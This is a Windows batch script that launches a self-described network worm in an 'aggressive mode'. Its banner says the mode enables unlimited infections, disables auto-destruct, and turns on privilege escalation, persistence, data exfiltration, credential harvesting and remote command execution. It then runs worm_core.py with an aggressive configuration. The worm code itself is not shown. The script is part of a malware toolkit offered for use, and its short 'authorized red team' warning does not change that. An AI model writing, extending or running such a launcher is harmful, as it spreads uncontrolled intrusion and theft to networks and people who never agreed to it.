@echo off
REM AGGRESSIVE MODE - Full Offensive Capabilities
REM ⚠️ WARNING: This enables ALL attack features

echo ============================================================
echo ML NETWORK WORM - AGGRESSIVE MODE
echo ============================================================
echo.
echo ⚠️⚠️⚠️ WARNING ⚠️⚠️⚠️
echo.
echo This configuration enables:
echo   - UNLIMITED infections
echo   - NO auto-destruct
echo   - Privilege escalation
echo   - Persistence mechanisms
echo   - Data exfiltration
echo   - Credential harvesting
echo   - Remote command execution
echo.
echo ONLY use in AUTHORIZED red team operations!
echo.
echo ============================================================
echo.
echo Press Ctrl+C to cancel, or
pause

echo.
echo Starting AGGRESSIVE mode...
echo.
echo Kill switch: EMERGENCY_STOP_AGGRESSIVE_2024
echo.

REM Add Nmap to PATH
set PATH=%PATH%;C:\Program Files (x86)\Nmap

python worm_core.py --config config_aggressive.yaml

echo.
echo ============================================================
echo Aggressive mode execution complete
echo ============================================================
pause
